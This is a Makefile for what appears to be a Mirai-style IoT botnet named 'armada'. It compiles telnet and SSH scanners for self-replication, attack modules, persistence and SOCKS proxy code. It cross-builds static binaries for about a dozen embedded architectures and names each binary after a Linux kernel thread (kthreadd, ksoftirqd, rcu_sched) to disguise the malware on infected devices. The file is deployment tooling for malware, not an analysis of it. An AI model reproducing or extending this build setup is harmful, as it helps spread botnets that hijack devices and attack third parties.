CC        ?= gcc
CFLAGS     = -Os -s -Wall -Wno-unused -Wno-all -ffunction-sections -fdata-sections -Iheaders
LDFLAGS    = -lpthread -Wl,--gc-sections -Wl,--strip-all
CORE_SRCS  = ds.c crypto.c config.c opsec.c connection.c commands.c persist.c socks.c main.c
SCAN_SRCS  = telnet.c ssh.c scanner_http.c scan_report.c
ATK_SRCS   = attack.c attack_method.c
SRCS       = $(CORE_SRCS)

ifneq ($(NO_SELFREP),1)
SRCS      += $(SCAN_SRCS)
else
CFLAGS    += -DNO_SELFREP
endif

ifneq ($(NO_ATTACK),1)
SRCS      += $(ATK_SRCS)
else
CFLAGS    += -DNO_ATTACK
endif

BIN        = armada
XC        ?= /etc/xcompile
BINS       = ../bins

.PHONY: all clean all-arch

all: $(BIN)

$(BIN):
	$(CC) $(CFLAGS) -B/usr/bin -o $@ $(SRCS) $(LDFLAGS)

clean:
	rm -f $(BIN)
	@mkdir -p $(BINS) && rm -f $(BINS)/*

# Universal cross-build for relocated uClibc toolchains
# $(1)=toolchain root  $(2)=gcc binary  $(3)=cc1 dir  $(4)=binutils dir
# $(5)=gcc internal headers  $(6)=uclibc headers  $(7)=gcc libs  $(8)=uclibc libs
# $(9)=output name  $(10)=label
define XB
	@mkdir -p $(BINS)
	@echo -n "  $(10)... "
	@$(2) $(CFLAGS) \
		-B$(3)/ -B$(4)/ -B$(7)/ -B$(8)/ \
		-nostdinc -isystem $(5) -isystem $(6) \
		-L$(8) -L$(7) \
		-static -o $(BINS)/$(9) $(SRCS) \
		-lpthread -Wl,--gc-sections 2>/dev/null && \
		echo "$$(du -h $(BINS)/$(9) | cut -f1)" || echo "FAIL"
endef

# Simpler macro for self-contained toolchains (x86_64, i586, i486, mips, arc)
define XS
	@mkdir -p $(BINS)
	@echo -n "  $(3)... "
	@$(1) $(CFLAGS) -static -o $(BINS)/$(2) $(SRCS) \
		-lpthread -Wl,--gc-sections 2>/dev/null && \
		echo "$$(du -h $(BINS)/$(2) | cut -f1)" || echo "FAIL"
endef

all-arch: $(BIN)
	@echo "=== Building all architectures (pure C, static, zero deps) ==="
	@echo -n "  native... " && du -h $(BIN) | cut -f1
	@mkdir -p $(BINS) && cp -f $(BIN) $(BINS)/migration_0
	$(call XS,$(XC)/x86_64/bin/x86_64-gcc,migration_0,x86_64)
	$(call XS,$(XC)/i586/bin/i586-gcc,rcu_preempt,i586)
	$(call XS,$(XC)/cross-compiler-i486/bin/i486-gcc,kthreadd,i486)
	$(call XS,$(XC)/mips/bin/mips-gcc,kintegrityd_be,mips)
	$(call XS,$(XC)/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install/bin/arc-linux-gcc,ksoftirqd,arc)
	$(call XB,$(XC)/mipsel,\
		$(XC)/mipsel/mipsel-unknown-linux/bin/gcc,\
		$(XC)/mipsel/libexec/gcc/mipsel-unknown-linux/4.1.2,\
		$(XC)/mipsel/mipsel-unknown-linux/bin,\
		$(XC)/mipsel/gcc/include,$(XC)/mipsel/include,\
		$(XC)/mipsel/gcc/lib,$(XC)/mipsel/lib,\
		kintegrityd,mipsel)
	$(call XB,$(XC)/armv4l,\
		$(XC)/armv4l/armv4l-unknown-linux/bin/gcc,\
		$(XC)/armv4l/libexec/gcc/armv4l-unknown-linux/4.1.2,\
		$(XC)/armv4l/armv4l-unknown-linux/bin,\
		$(XC)/armv4l/gcc/include,$(XC)/armv4l/include,\
		$(XC)/armv4l/gcc/lib,$(XC)/armv4l/lib,\
		writeback_0,armv4l)
	$(call XB,$(XC)/armv5l,\
		$(XC)/armv5l/armv5l-unknown-linux/bin/gcc,\
		$(XC)/armv5l/libexec/gcc/armv5l-unknown-linux/4.1.2,\
		$(XC)/armv5l/armv5l-unknown-linux/bin,\
		$(XC)/armv5l/gcc/include,$(XC)/armv5l/include,\
		$(XC)/armv5l/gcc/lib,$(XC)/armv5l/lib,\
		writeback_1,armv5l)
	$(call XB,$(XC)/armv6l,\
		$(XC)/armv6l/armv6l-unknown-linux-gnueabi/bin/gcc,\
		$(XC)/armv7l/armv6l-unknown-linux-gnueabi/bin,\
		$(XC)/armv6l/armv6l-unknown-linux-gnueabi/bin,\
		$(XC)/armv6l/cc/include,$(XC)/armv6l/include,\
		$(XC)/armv6l/cc/lib,$(XC)/armv6l/lib,\
		writeback_2,armv6l)
	$(call XB,$(XC)/powerpc,\
		$(XC)/powerpc/powerpc-unknown-linux/bin/gcc,\
		$(XC)/powerpc/libexec/gcc/powerpc-unknown-linux/4.1.2,\
		$(XC)/powerpc/powerpc-unknown-linux/bin,\
		$(XC)/powerpc/gcc/include,$(XC)/powerpc/include,\
		$(XC)/powerpc/gcc/lib,$(XC)/powerpc/lib,\
		cryptd,powerpc)
	$(call XB,$(XC)/sh4,\
		$(XC)/sh4/bin/sh4-rawgcc,\
		$(XC)/sh4/libexec/gcc/sh-superh-linux/4.1.2,\
		$(XC)/sh4/sh-superh-linux/bin,\
		$(XC)/sh4/gcc/include,$(XC)/sh4/include,\
		$(XC)/sh4/gcc/lib,$(XC)/sh4/lib,\
		irq_work,sh4)
	$(call XB,$(XC)/sparc,\
		$(XC)/sparc/bin/sparc-rawgcc,\
		$(XC)/sparc/libexec/gcc/sparc-unknown-linux/4.1.2,\
		$(XC)/sparc/sparc-unknown-linux/bin,\
		$(XC)/sparc/gcc/include,$(XC)/sparc/include,\
		$(XC)/sparc/gcc/lib,$(XC)/sparc/lib,\
		rcu_sched,sparc)
	$(call XB,$(XC)/m68k,\
		$(XC)/m68k/bin/m68k-rawgcc,\
		$(XC)/m68k/libexec/gcc/m68k-unknown-linux/4.1.2,\
		$(XC)/m68k/m68k-unknown-linux/bin,\
		$(XC)/m68k/gcc/include,$(XC)/m68k/include,\
		$(XC)/m68k/gcc/lib,$(XC)/m68k/lib,\
		migration_1,m68k)
	@echo "---" && ls -lhS $(BINS)/
